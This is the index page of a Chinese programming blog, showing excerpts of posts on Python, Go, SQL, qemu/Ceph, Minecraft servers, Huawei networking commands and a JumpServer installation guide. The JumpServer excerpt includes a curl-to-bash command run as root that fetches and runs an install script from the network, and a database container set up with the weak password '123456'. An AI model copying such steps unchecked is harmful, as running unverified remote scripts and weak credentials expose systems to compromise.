<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Posts - 菜鸟程序员博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Posts" />
<meta property="og:description" content="菜鸟程序员博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="https://cainiaoprogram.github.io/posts/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/posts/index.xml" title="菜鸟程序员博客">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="菜鸟程序员博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">菜鸟程序员博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<header class="main__header">
		<h1 class="main__title">Posts</h1>
	</header><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cbcec0ef91f0959a5c00423c8772e0c9/" rel="bookmark">
			新人报到
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 自我介绍博客平台写一些什么？为什么写博客？ 自我介绍 计算机硕士研究生在读（研二），研究方向为神经网络模型量化、模型部署、深度学习和计算机视觉等。
博客平台 CSDN：_leoatliang
2022年5月12日加入 CSDN，截至目前（2023年11月20日）已收获粉丝3000+、访问量47W+。起初作者只是纯粹的分享自己的学习记录/过程，并将其视作一个在线笔记，随着越来越多小伙伴们的关注，也会有一些小小的成就感。
微信公众号：Codeloop
所以在2023年11月20日注册了微信公众号，打算继续分享作者本人的学习记录/过程，也会涵盖一些好玩又有趣的小项目（搭建彩虹外链网盘、情侣网站等）或小工具（Netron、LaTeX-OCR等）。
注意：以上两个平台没有关注的麻烦关注一下哈，不喜欢就不用关注啦！！！
写一些什么？ 因为作者本人硕士在读，在科研的过程中少不了新东西的学习。就比如说，Python、PyTorch、Numpy 和 Pandas 的学习，还有深度学习环境的安装与配置以及各种工具的使用等等。
上述所罗列的并不是全部的内容，如若感兴趣，可先去作者的 CSDN 略读一下。
即将面临毕业找工作的需求，可能不久后还会出刷题（LeetCode）系列，分享一些刷题技巧、心得、思考以及代码实现。但作者不是算法大神，所以可能会有瑕疵甚至是错误，还请大家见谅。
为什么写博客？ 总的来说，写博客对我的科研学习和编程能力提高很有帮助。通过输出来驱动输入，不仅可以加深理解，还可以获取反馈意见。我会坚持写博客，在计算机这条道路上不断进步。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3bd1b65211ac8092688f9f2efca0f1c7/" rel="bookmark">
			python functools.wraps保留被装饰函数属性
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		作用 普通装饰器 ，会覆盖函数名称，并且 会替换 函数 文档字符串
介绍 functools.wraps(wrapped[, assigned][, updated])
This is a convenience function for invoking partial(update_wrapper, wrapped=wrapped, assigned=assigned, updated=updated) as a function decorator when defining a wrapper function. For example:
from functools import wraps
def my_decorator(f):
… @wraps(f)
… def wrapper(*args, **kwds):
… print ‘Calling decorated function’
… return f(*args, **kwds)
… return wrapper
…
@my_decorator
… def example():
… “”“Docstring”“”
… print ‘Called example function’
…
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3bd1b65211ac8092688f9f2efca0f1c7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d110faa07aeaee81d54f5070036ec52f/" rel="bookmark">
			qemu 使用 ceph rbd 存储块
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在cinder 集群之外安装 qemu # 好像需要开启 yum install epel-release -y yum install qemu -y 在 客户 机上 放置 授权文件 qemu-img {command} [options] rbd:glance-pool/maipo:id=glance:conf=/etc/ceph/ceph.conf 由于 qemu 命令 需要 /etc/ceph/ceph.conf 以及 keyring 所以我们去 集群中 取一下 scp -rp root@192.168.141.20:/etc/ceph /etc 创建 image # 第二个 rbd 是 pool 存储池名称 qemu-img create -f raw rbd:rbd/foo 1G qemu-img create -f raw rbd:rbd/qemu_img_client 1G rbd info qemu_img_client -&gt; rbd image 'qemu_img_client': size 1 GiB in 256 objects order 22 (4 MiB objects) snapshot_count: 0 id: 391b7fcc6093 qemu 查看镜像信息 qemu-img info rbd:rbd/foo -&gt; image: rbd:rbd/foo file format: raw virtual size: 1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d110faa07aeaee81d54f5070036ec52f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b18fe7f261c646619f439778c16b454c/" rel="bookmark">
			SQL 表连接
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在sql中表连接方式有left join (左连接)；rith join(右连接);inner join(内连接)；full join(全连接)；union all （上下拼接） union （上下去重拼接）
left join (左连接): 左连接是将左表作为底层表，然后将右侧的表连在上面。
例如：想知道学生的信息以及学生所学的科目
由于学生信息在student_info中 但是学习的科目在student_subject中，因此需要将两张表关联起来，然后查询需要的信息。
select a.student_id, a.student_name, a.student_age, a.student_sex, b.student_subject from ( select student_id, student_name, student_age, student_sex from student_info )a left join ( stu_id, student_subject from student_subject )b on a.stu_id=b.stu_id 此时a表和b表关联起来后形成一张总表，我们再在最外层选择是a表中的数据还是b表中的数据，如是a表，则写上a.字段名称；b表则写上b.字段名称。如果字段在a,b表其中一个的话可以不用指明是从哪个表里面选取的字段，直接写字段名称即可。但是如果同一个字段在两个或两个以上的表中，那么必须指明是那张表里面的字段。但为了代码规范以及快速查询是那张表里面的字段，最好是写上表名称。
right join (右连接): 左连接是将左表作为底层表，然后将右侧的表连在上面，那么右连接则是将右侧的表作为底层表，然后将左侧的表连在上面。
那么上面左连接的代码也可以写成：
select a.student_id, a.student_name, a.student_age, a.student_sex, b.student_subject from ( stu_id, student_subject from student_subject )b right join( select student_id, student_name, student_age, student_sex from student_info )a on a.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b18fe7f261c646619f439778c16b454c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1201311b35279e9be6fd9c9c88bb03fe/" rel="bookmark">
			go defer用法_类似与python_java_finially
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		defer 执行 时间 defer 一般 定义在 函数 开头, 但是 他会 最后 被执行 A defer statement defers the execution of a function until the surrounding function returns.
如果说 为什么 不在 末尾 定义 defer 呢, 因为 当 错误 发生时, 程序 执行 不到 末尾 就会 崩溃.
defer 的 参数 定义 会 立刻 被执行, 最后 被执行 的 只有 最外层 函数的 定义. The deferred call’s arguments are evaluated immediately, but the function call is not executed until the surrounding function returns.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1201311b35279e9be6fd9c9c88bb03fe/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e7e0efee610f981a9544269bf9908265/" rel="bookmark">
			go同步锁 sync mutex
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		goroutine http://127.0.0.1:3999/concurrency/11
go tour 到此 就结束了.
继续 学习 可以 从 以下网站 文档 https://golang.org/doc/
https://golang.org/doc/code
https://golang.org/doc/codewalk/functions/
博客 https://go.dev/blog/
wiki 服务器教程 服务器 教程 入口
https://golang.org/doc/articles/wiki/
https://github.com/gin-gonic/gin
官网 https://golang.org/
sync.mutex Lock package main import ( "fmt" "sync" "time" ) // SafeCounter is safe to use concurrently. type SafeCounter struct { mu sync.Mutex v map[string]int } // Inc increments the counter for the given key. func (c *SafeCounter) Inc(key string) { c.mu.Lock() // Lock so only one goroutine at a time can access the map c.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e7e0efee610f981a9544269bf9908265/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d2fadfd84301796ffae7a4e6e8c924b2/" rel="bookmark">
			如果重复定义宏，两个值不同，最终的值是哪一个？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		task F；
`define AA 5 //定义一个宏，先编译
print(AA);
# 5;
`define AA 10 //重复定义宏，后编译
// 后面的值会覆盖前面定义的宏，但不是覆盖所有域，按照编译顺序，只覆盖该位置往后的域
print（AA）;
# 10;
endtask
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f18f00d789b95d65738ba12a43c24b0f/" rel="bookmark">
			从学校里的“同学”到大厂的“同学”我做了些什么......
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 最近在看脉脉的时候，看到了一个挺有趣的提问：
评论区有两个高赞回答很是耐人寻味。
第一个还算是正经的回答，但是这个称谓会产生或许还要加上个前提，那就是——一般是刚入职没几
年的员工，等年龄上去了，芜湖，就可能变成老师或者姐、哥了。
当然除了以上几点，大概率还是为了“扁平化管理”。
这样可以营造出亲切、友好、平等、开放的氛围，强调团队合作和共同成长，突出年轻、活力的氛
围，符合企业文化和价值观，有助于促进员工之间的交流和合作，提高团队的凝聚力和战斗力。
至于第二个回答就多少有点幽怨的情绪在了，但是也不无道理，甚至还有点参透什么大道理的冷漠
感，甚至我是深有体会的，因为我就是那个走向大厂的“同学”。
在学校的学生 在高中时候的辛苦是很多人不愿意回顾的，我当初从高一开始就准备竞赛，同时又要保持每门科目成
绩不能太差，因为基础太差，地动山摇。
当时周末还要去上各种补习班，其中就有从初中就开始上的编程课，这算是我当初比较喜欢的课了，
这一点还要感谢我的母亲慧眼识珠，那么早就让我接触了编程。
除此之外，就不说太多上学的时候怎么怎么苦了，毕竟就算是苦，也是有个目标在的，这种有奔头的
日子还是好过的。
在出学校的路上的学生 都说大学就是一个小社会，到了大学就要多接触社会了，我当初就没闲着，努力拿到了两段大厂的实
习经验，实习的日子让我晓得了学校学的东西是远远不够的，所以，我课后花了超多的时间去弥补我
与社会需求的差距。
比如现在很多想进Android的同学总是学不明白，学不清楚，我当初有个朋友也是，而且当时网上的资
料也不丰富，学得很艰难，现在就不一样了，只要你想学，肯定能找到你合适的。比如这些：
实在是不要荒废了你的大学，通宵玩游戏，真是不如通宵抡代码来的酷！
在大厂的学生 都说进大厂好，福利好待遇好，我当然是狠狠地信了，但是 我是怎么进大厂的？
首先肯定是找到网络上的内推，然后根据岗位dg对症下药，结合大环境现状合理回答…
什么？你说太抽象了？好吧好吧，我以前面试用的资料给你看——
当然肯定有些人不需要这些小技巧，纯实力惊呆hr也可以拿到offer，但是我们普通人还是需要不那么
安分地做点什么吧。
尾声 从学校里的同学到大厂的同学，我付出了很多的汗水泪水，这些不能量化的东西，在最后质变成了大
厂的一句“同学”，你说我有没有后悔过？或许是有的，我偶尔也会羡慕人家安稳清贫的生活，但是命
运的标价早已决定，我们要做的不是总回头看，而是义无反顾地朝前看，难道不是么？
另外说一句，前面提到过的资料都整理在下面二维码啦，有需要的同学~赶紧领取吧！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bf184217c16be91c3b5469030bbccd4b/" rel="bookmark">
			MC 1.18.2 FORGE 开服教程及自动备份
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一.准备环境
1.云服务器
2.登录服务器
3.安装需求
二.服务端运行
1.启动
2.服务端
3.自动脚本(记得改权限)
4.服务端优化方式
5.问题解决 一.准备环境 本文作者搭建环境:华为云HECS,Linux,JAVA18, Forge40.1.73(对于其它Minecraft版本类似)
1.云服务器 这篇教程不会深入讨论有关服务器的知识与技术，如有更高要求请参考其他大佬。
同时，服务器厂商有详细的说明文档。
2.登录服务器 这里使用XShell和Xftp为例。XShell(www.xshell.com/zh/xshell)官网。下载安装后打开
点击新建
名称自取，主机为服务器公网IP地址,然后切换到“用户身份验证”,输入用户名及密码,用户名填"root"即可，其他不用修改(如果有ssl密钥则优先考虑使用,这里不做说明,如果需要可以搜索使用方法)。确定或连接即可。
3.安装需求 这里使用常规的Screen方法即可。Screen是一款命令行终端切换软件，这里用于维持Minecraft Server的运行。
连接你的服务器之后应该出现如下画面
输入”yum install wget”会出现确认提示，按”y”键确认。有些服务器可能已经安装，则跳过 接下来输入
yum install screen 按”y”键确认。出现complete字样即可。
然后安装Java,输入
yum list java* 有些服务器可能不全,但是Minecraft1.18.2需要java17以上才能运行，这时候只能去官网下载Oracle Java18(www.oracle.com/java/technologies/javase/jdk18-archive-downloads.html)
选择第三个Linux ×64压缩归档，用Xftp上传至服务器，可以先在本地解压后在上传。
或者在XShell上使用"tar -zxvf 文件名.tar.gz"解压。推荐先上传压缩包再在服务器上解压。
Xftp设置方式与XShell差不多，而且可以相互呼出。
接下来，下载minecraft 1.18.2 server和Forge文件
Minecraft 1.18.2https://launcher.mojang.com/v1/objects/1c898afff0449eed08ad8036aaa4c652952035de/server.jar
Forgehttp://files.minecraftforge.net/net/minecraftforge/forge/
Forge官网上如果卡在广告，那么在选择了合适的版本后,右键Installer复制连接在下载。
二.服务端运行 这里不讨论Minecraft服务器配置(比如server.properties)，网上有太多文章了。
1.启动 在本地新建文件夹用于存放MC服务器文件和Forge文件(在远程服务器上一样，个人习惯)，然后运行server.jar，第一次安装过程应该必定失败，应为你要先同意eula,在server.jar同文件夹下会在第一次运行时生成eula.txt，用文本编辑器打开并修改为true.
PS:在一般情况下,你的电脑(或服务器)应该只安装了java18/java17。按win + r ，在输入cmd打开提示符窗口,输入"java -version"查看。如果没有显示你希望的版本，就需要在启动时选择运行Java的目录了。
在server.jar所在目录中右键(或自己cd进去。"cd d:"进入D盘；"cd mc/1.18.2"进入D:/mc/1.18.2；"cd ../"返回上一级)，打开终端输入
java -jar server.jar 以运行(可以在此命令最后加 "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bf184217c16be91c3b5469030bbccd4b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ee53b7cdae514e2ff2a60cedf7872511/" rel="bookmark">
			计算机网络实验——华为eNSP模拟器常用命令总结（总结的非常详细( •̀ .̫ •́ )✧快来看啊）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 前言一、华为设备命令视图二、设置设备名称三、常用基本命令四、关闭泛洪信息五、设置设备接口的ip地址和子网掩码六、交换机的登陆(一)设置Console接口密码(二)设置Telnet接口密码 七、VLAN配置(一)单独和批次创建VLAN(二)进入VLAN视图(三)将端口指定到VLAN1、单一端口指定VLAN2、多个端口指定VLAN (四)查看配置情况 八、交换机端口工作模式(一)Access模式(接入模式)(二)Trunk模式(三)Hybrid模式 九、QinQ技术十、VCMP（VLAN集中管理协议）十一、GVRP(VLAN注册协议)十二、STP（生成树协议）十三、VRRP(虚拟路由冗余协议)十四、BFD（双向转发检测）十五、显示路由器的路由十六、静态路由、默认路由的配置十七、向当前路由表中添加一条新的路由表条目十八、DHCP（动态主机配置协议）(一)接口模式的DHCP命令(二)全局模式的DHCP命令 前言 软考网络工程师中一般以华为VRP系统的命令模式为基础，运行VRP操作系统的华为产品包括路由器、局域网交换机以及专用硬件防火墙等，本篇文章总结了以华为eNSP模拟器在计算机网络中的常用命令，都是自己在备考时总结的，对考华为认证、网络工程师等可供参考，有需要文件的可以私信我或者留言在评论区！如果哪里命令或者文字描述有问题，欢迎大家在评论区指出，感谢支持！！！
另外，还有一些官方的命令参考文件以及华为盒式交换机的相关PDF文件，也可以留言获取。
一、华为设备命令视图 以下是华为设备的常用命令视图：
用户视图：&lt; Huawei&gt;
系统视图：&lt; Huawei&gt;system-view/sys [Huawei]
接口视图：
&lt; Huawei&gt;system-view/sys
[Huawei]interface/int Ethernet0/0/1
[Huawei- Ethernet0/0/1]
路由协议视图：[Huawei]isis
[Huawei- isis-1]
二、设置设备名称 sysname/sy命令设置设备的名称
&lt; Huawei&gt; system-view
[Huawei] sysname Switch 更改设备名称
[Switch]
三、常用基本命令 1、quit 命令 返回上一级视图
2、return 命令 直接返回&lt; Huawei&gt;用户视图
3、save 命令 在&lt; Huawei&gt;用户视图使用，保存配置
4、reboot 命令 重启设备
5、shutdown 命令 关闭端口
undo shutdown 命令 激活端口
6、undo 命令，有以下：
（1）用于恢复缺省情况（例如设置设备的名称）
&lt; Huawei&gt; system-view
[Huawei] sysname Switch
[Switch] undo sysname 恢复缺省情况
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ee53b7cdae514e2ff2a60cedf7872511/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e5acc9c62781aec770509917b3fb4841/" rel="bookmark">
			Android getLocalVisibleRect与 getGlobalVisibleRect方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		getGlobalVisibleRect(rect);，是以屏幕左上角为参考系，判断view有一部分在屏幕中，返回true（没有被父View遮挡）。反之，如果它全部被父View遮挡住或者本身就是不可见的，返回false。getLocalVisibleRect(rect);，当View可见时，以自身View左上角为参考系，坐标系的原点为View自己的坐标原点。当View不可见时，以父控件左上角为参考系，坐标系的原点为View的父控件的坐标原点。 为了更好理解，Demo如下：（测试机分辨率为720*1440，橙红色view为400*400px。布局为一个RelativeLayout嵌套这TextView）
屏幕包含蓝色状态栏！！高度为55px，所以计算的结果要考虑到这个问题
当Textview设置marginLeft="100px"、marginTop="100px"时：
当Textview设置marginLeft="-100px"、marginTop="-100px"时：
当Textview设置marginRight="-100px"、marginBottom="-100px"时：
下面的理解主要针对getLocalVisibleRect(rect),View不可见的情况： 当Textview设置marginTop="-500px"时，此时TextView是在屏幕外的：
此时的getLocalVisibleRect(rect)，坐标系的原点为它的父控件的坐标原点，也就是外面嵌套的RelativeLayout，RelativeLayout的宽高都是match_parent的，所以他的数值跟getGlobalVisibleRect(rect)是相同的。
当Textview设置layout_marginBottom="-500px"，layout_marginRight="-500px"，都在父布局的底部时，此时TextView是在屏幕外的：
高度要考虑底部虚拟导航栏！！高度为55px，所以计算的结果要考虑到这个问题
此时的getLocalVisibleRect(rect)，坐标系的原点为它的父控件的坐标原点，也就是外面嵌套的RelativeLayout，RelativeLayout的宽高都是match_parent的，所以他的数值跟getGlobalVisibleRect(rect)是相同的。
TextView的宽、高为400px， layout_marginBottom="-500px"，layout_marginRight="-500px"，所以TextView距离屏幕右间距为100px，距离屏幕下间距为100px，
考虑到下部虚拟导航栏高度为55px，所以TextView距离屏幕底部实际距离为（100px-55px）=45px
左面：720+100 =820px
上面：1440+45=1485px
右面：720+100+400 =1220px
下面：1440+45+400 =1885px
判断View1是否在某个View2可视区域内
当使用getLocalVisibleRect(rect)时，当View不在可视区域内时：
在顶部，Rect.top &lt;0
在底部，Rect.bottom&gt;View2.getHeight
所以
fun isCover(activity: Activity, view1: View, view2: View): Boolean { val rect = Rect() view1.getLocalVisibleRect(rect) return !(rect.top&lt;0||rect.bottom&gt;view2.height) } 判断View可视区域占其自身百分比（当view1开始可视后调用，否则一直都是100%)
fun getVisibilePercent(activity: Activity, view1: View): Int { val rect = Rect() view1.getLocalVisibleRect(rect) Log.e("测试","rect.height ="+rect.height().toString() + " view1.height ="+view1.height) val a = rect.height() * 100 / view1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e5acc9c62781aec770509917b3fb4841/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/249e2ffd932b6659097cd94435d0f3a3/" rel="bookmark">
			JavaScript中字符串转数字的几种方式及性能比较
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		引言 在JavaScript中，字符串转换为数字是一项常见的操作。本文将介绍几种常用的字符串转数字的方式，并通过性能测试比较它们的效率。我们将深入探讨每种方法的原理、使用场景，并总结它们的优劣。
方法介绍 1. parseInt() 函数 parseInt(stringValue, 10); 原理： parseInt() 函数从字符串的开头开始解析，返回整数部分，直到遇到非数字字符。第二个参数指定基数（常用的是十进制）。
使用场景： 适用于将字符串转换为整数，特别是当字符串表示整数时。
2. parseFloat() 函数 parseFloat(stringValue); 原理： parseFloat() 函数从字符串的开头开始解析，返回浮点数部分，直到遇到非数字字符。
使用场景： 适用于将字符串转换为浮点数，处理包含小数的情况。
3. Number() 函数 Number(stringValue); 原理： Number() 函数试图将给定的值转换为数字。对于字符串，类似于 parseFloat()，允许包含小数点。
使用场景： 适用于通用的数字转换，包括整数和浮点数。
4. Unary Plus（+ 运算符） +stringValue; 原理： 使用 + 运算符对字符串进行操作会将其转换为数字。
使用场景： 适用于快速、简便的字符串转换为数字需求。
5. Math.floor() 函数 Math.floor(stringValue); 原理： Math.floor() 向下取整，尝试将字符串转换为整数。
使用场景： 适用于需要将字符串转换为整数，并将小数部分舍去的情况。
性能测试及总结 通过执行一百万次的循环测试，得到以下结果：
parseInt(): 42.22 msparseFloat(): 44.58 msNumber(): 33.38 msUnary Plus (+): 30.85 msMath.floor(): 32.95 ms 从性能测试结果可以看出，Unary Plus (+) 运算符是最快的，其次是 Math.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/249e2ffd932b6659097cd94435d0f3a3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bdb4efa0cba07c4c444138b40bf062aa/" rel="bookmark">
			JavaScript中数字转字符串的几种方式及性能比较
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在JavaScript中，将数字转换为字符串是一项常见的操作。本文将介绍几种常用的数字转字符串的方式，并通过性能测试比较它们的效率。我们将深入探讨每种方法的原理、使用场景，并总结它们的优劣。
常见方式 String() 函数：
let num = 42; let str = String(num); 原理： String() 函数是将给定的值转换为字符串的内建函数。对于数字，它会将其转换为相应的字符串表示。
使用场景： 适用于通用的数字转字符串需求。是一种简单而直观的方法。
toString() 方法：
let num = 42; let str = num.toString(); 原理： toString() 方法是基本数据类型的方法之一，用于将数字转换为字符串。
使用场景： 通常与数字对象一起使用，适用于数字对象的场景。
模板字符串（Template String）：
let num = 42; let str = `${num}`; 原理： 使用模板字符串是一种简洁的方式，它在字符串中嵌入了变量，这里的变量是数字。
使用场景： 适用于需要在字符串中嵌入变量的情况，同时进行数字转字符串。
String Concatenation（字符串拼接）：
let num = 42; let str = '' + num; 原理： 在JavaScript中，使用 + 运算符进行字符串拼接时，会将数字隐式转换为字符串。
使用场景： 适用于快速、简便的数字转字符串需求。
new String() 构造函数
new String(num) 原理： 使用 new String() 构造函数创建一个字符串对象，将数字作为参数传入。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bdb4efa0cba07c4c444138b40bf062aa/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/df5879d69e4efe9f9df0d2bfc7e0716c/" rel="bookmark">
			CNN-LSTM组合预测模型，输入数据是多列输入，单列输出的回归预测模型
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		CNN-LSTM组合预测模型，输入数据是多列输入，单列输出的回归预测模型，代码内部有基本注释，替换数据就可以使用，版本需求是2020及以上
近年来，随着大数据时代的到来，人们对于预测模型的需求越来越高。其中，CNN-LSTM组合预测模型一直受到众多研究者的关注。这种模型可以通过多列输入进行回归预测，具有较高的预测准确度和实用性。本文将为大家介绍该模型的原理和实现方法，以及在实践中的应用效果和注意事项。
首先，我们来看看CNN和LSTM分别是什么。CNN（Convolutional Neural Network）卷积神经网络是一种常见的神经网络结构，广泛应用于图像处理、自然语言处理等领域。LSTM（Long Short-Term Memory）长短期记忆网络是一种特殊的循环神经网络，可以有效解决传统循环神经网络存在的梯度消失和梯度爆炸问题，适用于处理时间序列数据。
而CNN-LSTM组合模型则是将两种神经网络结构相结合，充分利用它们的优势。在输入数据为多列输入、单列输出的回归预测问题中，可以将每列数据看作一个时间序列，然后使用CNN提取每个时间序列的特征，再将这些特征输入到LSTM网络中进行预测。
在实现方面，我们可以使用Python编程语言来实现该模型。具体来说，我们可以使用TensorFlow框架来搭建CNN和LSTM网络结构，然后将它们结合起来作为整个预测模型。代码中有基本注释，使用者只需要根据自己的数据进行简单的数据替换即可使用。需要注意的是，该模型的版本需求是2020及以上。
在应用方面，该模型具有较高的预测准确度和实用性，可以应用于金融、气象、工业等多个领域，对于实时预测和长期趋势预测等问题都有较好的表现。但需要注意的是，在使用该模型时，我们需要注意样本量的大小、数据的预处理、模型参数的选择等问题，以保证预测效果的准确性和稳定性。
综上所述，CNN-LSTM组合预测模型是一种具有较高应用价值的回归预测模型。本文详细介绍了该模型的原理和实现方法，并探讨了在实践中的应用效果和注意事项。希望本文对于研究者和应用者有所帮助，为大家提供参考和借鉴。
相关代码,程序地址：http://lanzouw.top/668649036617.html
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/221c1f9c040efbd2d88c362730533419/" rel="bookmark">
			JumpServer安装及使用配置
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
安装JumpServer
JumpServer属于堡垒机，openvpn属于跳板机
ＭySQL
Redis Jumpserver 使用/账号管理 三大账号分类
邮件设置​编辑
​编辑 添加系统用户账号。可以创建分组，添加多个分组 云也行 ​编辑 创建普通账号让以普通权限链接 ​编辑
自动推送，通过内置的ansible创建账号
​编辑创建账号的资产授权，
​编辑 excel表格批量ip导入导出
安装JumpServer 吹个牛批这是我师哥写的JumpServer，同一个老师，就是我有点废物其余的没啥
JumpServer属于堡垒机，openvpn属于跳板机 跳板机概述
跳板机就是一台服务器，开发或运维人员在维护过程中首先要统一登录到这台服务器，然后再登录到目标设备进行维护和操作。 跳板机缺点：没有实现对运维人员操作行为的控制和审计，使用跳板机的过程中还是会出现误操作、违规操作导致的事故，一旦出现操作事故很难快速定位到原因和责任人；
堡垒机概述：
堡垒机，即在一个特定的网络环境下，为了保障网络和数据不受来自外部和内部用户的入侵和破坏，而运用各种技术手段实时收集和监控网络环境中每一个组成部分的系统状态、安全事件、网络活动，以便集中报警、及时处理及审计定责。 总结：堡垒机比跳板机多了实时收集、监控网络环境、集中报警等功能。
准备一台 2核4G （最低）且可以访问互联网的 64 位 Linux 主机；以 root 用户执行如下命令一键安装 JumpServer。 curl -sSL https://github.com/jumpserver/jumpserver/releases/download/v2.25.4/quick_start.sh | bash https://docs.jumpserver.org/zh/master/install/setup_by_fast/ [root@ubuntu2004 ~]#echo '{"registry-mirrors": ["https://frc3mkbl.mirror.aliyuncs.com"]}'&gt; /etc/docker/daemon.json #加速器
[root@ubuntu2004 ~]#cat /etc/docker/daemon.json {"registry-mirrors": ["https://frc3mkbl.mirror.aliyuncs.com"]}
[root@ubuntu2004 ~]#docker info 查看是否成功（加速）
docker run --rm --name mysql -e MYSQL_ROOT_PASSWORD=123456 -e MYSQL_DATABASE=jumpserver -e MYSQL_USER=jumpserver -e MYSQL_PASSWORD=123456 -d -p 3306:3306 mysql:5.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/221c1f9c040efbd2d88c362730533419/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/73034cf1c5c454be51dead11a983cf17/" rel="bookmark">
			Windows10 利用注册表开启护眼模式(护眼软件无法涉及到的区域)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1, 在 运行 输入框里输入regedit ,进入注册表编辑器
2, 在计算机下方依次展开“HKEY-CURRENT-USER”—“ Control Panel”—“ Colors”==&gt;在右侧的各项值键当中找到 "Window"项 , 将其值更改成 202 234 206 点击确定后，注销或重启电脑即可 !
即会向上图所示，原白底 背景色会变成 绿色 ,背景色变更范围的相关应用有：记事本、运行窗口、Navicat 等工具，以下是成品效果图.
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a28686abeafb304f39dd806e84650ea4/" rel="bookmark">
			Kotlin回顾——高阶函数与Lambda
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Kotlin中函数都是头等的，这意味着它可以存储在变量与数据结构中、作为参数传递给其他高阶函数以及从其他高阶函数返回。可以向操作任何其他非函数值一样操作函数。
为促成这点，作为一门静态类型编程语言的Kotlin使用一系列函数类型来表示函数并提供了一组专门的语言结构，例如Lambda表达式。
这段话来自Kotlin文档。从没有接触过Kotlin的话这段话的意思很难理解，上面有三个关键词【高阶函数】、【函数类型】、【Lambda表达式】先分析这三个关键词然后再对上面这段话进行理解。
1.函数类型 函数类型就是函数的类型， 变量有类型Int、String等，那函数的类型到底是指什么？
